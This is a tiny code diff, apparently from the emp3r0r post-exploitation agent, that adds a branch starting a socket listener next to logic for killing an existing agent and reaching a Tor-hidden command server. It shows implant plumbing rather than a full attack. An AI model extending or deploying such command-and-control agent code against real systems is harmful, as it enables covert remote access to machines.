@@ -260,6 +260,8 @@ test_agent:
 				log.Printf("Failed to kill existing emp3r0r agent: %v", err)
 			}
 		}
+	} else {
+		go socketListen()
 	}
 
 	// if CC is behind tor, a proxy is needed
